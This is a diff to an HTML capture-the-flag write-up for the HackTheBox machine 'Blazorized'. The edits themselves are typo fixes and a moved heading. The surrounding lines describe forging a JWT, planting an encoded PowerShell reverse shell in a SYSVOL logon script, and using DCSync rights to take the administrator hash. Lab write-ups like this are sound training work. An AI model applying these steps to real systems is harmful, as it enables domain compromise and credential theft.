@@ -229,7 +229,7 @@
 <p><img src="/images/HTB-Blazorized/JWT_info.png" alt="JWT info"></p>
 <p><img src="/images/HTB-Blazorized/JWT_info2.png" alt="JWT info2"></p>
 <p><img src="/images/HTB-Blazorized/JWT_info3.png" alt="JWT info3"></p>
-<p>Beloe is all the information we need:</p>
+<p>Below is all the information we need:</p>
 <pre tabindex="0"><code># For the Header (make sure to change the algorithm to 512 at the top of the page)
 
 &#34;alg&#34;: 512
@@ -343,10 +343,10 @@ Value = YOUR_ENCODED_JWT
 <pre tabindex="0"><code> echo &#34;powershell -e JAB...&#34; | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII 
 </code></pre><p><img src="/images/HTB-Blazorized/logon_script_revshell.png" alt="Logon script revshell"></p>
 <p>On our listener we catch a shell as <code>SSA_6010</code>.</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
 <p><img src="/images/HTB-Blazorized/SSA_6010_shell.png" alt="SSA_6010 shell"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>We switch to a meterpreter shell, upload SharpHound to the target an run it a second time.</p>
-<p><code>SSA_6010</code> is part of the <code>Super_Support_Administrators</code>.</p>
+<p><code>SSA_6010</code> is part of the <code>Super_Support_Administrators</code> group.</p>
 <p><img src="/images/HTB-Blazorized/SSA_6010_group_membership.png" alt="SSA_6010 group memberships"></p>
 <p>The members of this group have the <code>DCSync</code> right on the Domain Controller. We can use this right to achieve a DCSync attack and get the administrator password hash.</p>
 <blockquote>
